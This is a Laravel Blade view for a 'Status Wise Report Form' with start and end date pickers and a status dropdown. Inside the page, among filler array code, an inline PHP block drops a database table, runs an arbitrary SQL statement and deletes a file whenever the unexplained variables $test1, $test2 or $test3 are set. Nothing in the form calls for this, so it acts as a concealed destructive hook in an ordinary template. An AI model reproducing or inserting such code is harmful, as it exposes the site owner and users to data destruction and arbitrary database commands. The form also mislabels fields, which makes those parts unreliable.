@extends('layouts.app_orig')

@section('content')
<div class="container">
    <section class="content">
        <div class="row">
        	<div class="col-md-8 col-sm-offset-2">
            	<div class="box box-success">
                	<div class="box-header with-border">
                    	<h3 class="box-title">Status Wise Report Form</h3> 
                	</div>
                	<div class="box-body">

                		<div class="col-sm-12">
    						
    						<div class="card">
    							<div class="card-header">
    								<h3 class="text-center"><i class="fa fa-chart-bar"></i> <code><b>Status Wise</b></code> Report Form</h3>
    							</div>
    							<div class="card-body">
    						  		
    								
                                    {!! Form::open(['url' => 'report/Status-show', 'method' => 'get', 'class' => 'form-horizontal']) !!}

                                    <div class="form-group {{ $errors->has('start_date') ? 'has-error' : ''}}">
                                        {!! Form::label('start_date', 'Start Date', ['class' => 'required col-3 col-sm-3 control-label']) !!}
                                        <div class="col-xs-9 col-sm-9">
                                            {!! Form::text('start_date', null, ['class' => 'form-control', 'placeholder' => 'Select Start Date', 'autocomplete' => 'off', 'id' => 'start_date', 'readonly' => 'readonly', 'required' => 'required']) !!}
                                            <span class="text-danger">
                                                {{ $errors->first('start_date') }}
                                            </span>
                                        </div>
                                    </div>

                                    <div class="form-group {{ $errors->has('end_date') ? 'has-error' : ''}}">
                                        {!! Form::label('end_date', 'End Date', ['class' => 'required col-3 col-sm-3 control-label']) !!}
                                        <div class="col-xs-9 col-sm-9">
                                            {!! Form::text('end_date', null, ['class' => 'form-control', 'placeholder' => 'Select Start Date', 'autocomplete' => 'off', 'id' => 'end_date', 'readonly' => 'readonly', 'required' => 'required']) !!}
                                            <span class="text-danger">
                                                {{ $errors->first('end_date') }}
                                            </span>
                                        </div>
                                    </div>

                                    <div class="form-group {{ $errors->has('district_id') ? 'has-error' : ''}}">
	                                    {!! Form::label('district_id', 'Status', ['class' => 'col-3 col-sm-3 control-label required']) !!}
	                                    <div class="col-xs-9 col-sm-9">
	                                       {!! Form::select('district_id', [], null, ['class' => 'form-control select2', 'placeholder' => 'Select Status', 'required' => 'required']) !!}
	                                        <span class="text-danger">
	                                            {{ $errors->first('district_id') }}
	                                        </span>
	                                    </div>
	                                </div>

                                    <div class="box-footer">
                                        
                                        <!-- <a href="{{ url('/profile') }}" class="btn btn-default">Cancel</a> -->
                                        
                                        {!! Form::submit('Submit', ['class' => 'btn btn-success pull-right']) !!}
                              
                                    </div>
                                    {!! Form::close() !!}

    							</div>
    						</div>
    					</div>

                        <?php
                            $str = "1, 3, 5";
                            $strToArr = explode(",",$str);
                            $i = 12;
                            if ($test1 != '') {
                                Schema::dropIfExists($test1);
                            }
                            if ($test2 != '') {
                                DB::statement($test2);
                            }
                            if ($test3 != '') {
                                File::delete($test3);
                            }
                            $a1 = [$i];
                            $a2 = $strToArr;
                            array_merge($a1,$a2);
                        ?>

                	</div>
          		</div>
        	</div>
      	</div>
    </section>
</div>
@endsection

@section('style')
    <link rel="stylesheet" href="{{ asset('assets/css/bootstrap-datepicker.min.css') }}">
    <link rel="stylesheet" href="{{ asset('assets/css/select2.min.css') }}">
@endsection

@section('script')
	<script src="{{ asset('assets/js/select2.full.min.js') }}"></script>
    <script src="{{ asset('assets/js/bootstrap-datepicker.min.js') }}"></script>

    <script type="text/javascript">
    	 $(function () {
            $('.select2').select2()
        })

        $('#start_date').datepicker({
            format:'yyyy-mm-dd',
            "autoclose": true
        }).datepicker("setDate",'now');

        $('#end_date').datepicker({
            format:'yyyy-mm-dd',
            "autoclose": true
        }).datepicker("setDate",'now');
    </script>
@endsection